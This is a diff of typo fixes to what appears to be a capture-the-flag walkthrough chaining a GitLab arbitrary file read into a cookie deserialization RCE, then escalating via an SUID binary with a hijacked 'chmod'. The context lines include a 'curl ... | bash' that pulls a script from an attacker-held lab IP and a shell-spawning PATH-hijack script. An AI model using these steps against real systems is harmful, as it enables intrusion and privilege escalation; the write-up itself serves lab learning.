@@ -66,9 +66,9 @@ This is a vulnerable version
 ### References:
 - https://hackerone.com/reports/827052
 
-We have an arbitrary file read by moving an issues (with the payload in the description) from one project to another.
+We have an arbitrary file read by moving an issue (with the payload in the description) from one project to another.
 
-This can be turn into a RCE by reading the secret key, and then use a deserialize attack on the cookie.
+This can be turned into a RCE by reading the secret key, and then use a deserialize attack on the cookie.
 
 - Create two projects
 - Add an issue with the following description:
@@ -123,7 +123,7 @@ gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
 ```
 
 
-next we want to grab the `secret_key_base` file
+next, we want to grab the `secret_key_base` file
 
 ![](Screen-shot/PAYLOAD%20LFI%20secret.png)
 
@@ -142,7 +142,7 @@ next we want to grab the `secret_key_base` file
 
 ![](Screen-shot/get%20secret%20key.png)
 
-Next we would need to host our own gitlab instance in order to achieve the deserialization attack
+Next, we would need to host our own gitlab instance in order to achieve the deserialization attack
 
 Pull the same gitlab version image from docker hub and then run the container
 ```bash
@@ -228,7 +228,7 @@ curl http://10.10.14.35:9002/deepce.sh | bash
 but nothing interesting shown up
 
 We should try to manually enumerate the gitlab application.
-Since we literally owner of the gitlab process, we can make an admin user, and enumerate the git server from that.
+Since we are literally the owner of the gitlab process, we can make an admin user, and enumerate the git server from that.
 
 Open the console from inside the container
 ```bash
@@ -257,7 +257,7 @@ Look at the SUID binaries
 
 ![](Screen-shot/SUID%20docker-security.png)
 
-The binary is owned by `dexter` and we can executed as `root` 
+The binary is owned by `dexter` and we can execute it as `root` 
 
 ### ltrace
 ```bash
@@ -277,7 +277,7 @@ system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/
 
 We see that once we are root, we can hijack the `chmod` binary since it doesn't use the absolute path
 
-create a `chmod` executable which essentially start a `bash` shell
+create a `chmod` executable which essentially starts a `bash` shell
 ```bash
 #!/bin/bash
 echo "chmod hijack"
